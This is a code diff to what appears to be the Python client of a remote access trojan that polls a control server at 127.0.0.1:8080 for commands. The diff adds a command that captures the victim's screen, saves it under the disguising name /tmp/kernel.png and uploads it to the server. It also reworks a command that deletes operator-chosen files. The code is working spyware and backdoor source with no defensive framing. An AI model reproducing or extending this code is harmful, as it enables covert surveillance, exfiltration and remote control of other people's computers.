@@ -1,5 +1,4 @@
-import requests,os,time,random,subprocess
-
+import requests,os,time,random,subprocess, pyscreenshot
 
 def connect():
     while 1:
@@ -16,15 +15,22 @@ def connect():
 
             else:
                 post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to transfer data')
+        elif 'screenshot' in command:
+            try:
+                image = pyscreenshot.grab()
+                image.save("/tmp/kernel.png")
+                url = 'http://127.0.0.1:8080/tmp'
+                files = {'file' : open("/tmp/kernel.png", "rb")}
+                r = requests.post(url,files=files)
+            except:
+                 post_response = requests.post(url='http://127.0.0.1:8080', data='[-] Not be able to capture screenshot')
+
         elif 'remove' in command:
-            if len(command)<=5:
-                r=requests.post("http://127.0.0.1:8080", data= "also enter the filename")
+            code,filename = command.split(' ')
+            if os.path.exists(filename):
+                os.remove(filename)
             else:
-                code,filename = command.split(' ') 
-                if os.path.exists(filename):
-                    os.remove(filename)
-                else:
-                    r=requests.post("http://127.0.0.1:8080", data= "The file does not exist")
+                r=requests.post("http://127.0.0.1:8080", data= "The file does not exist")
 
         elif 'cd' in command:
             code,directory = command.split(' ')
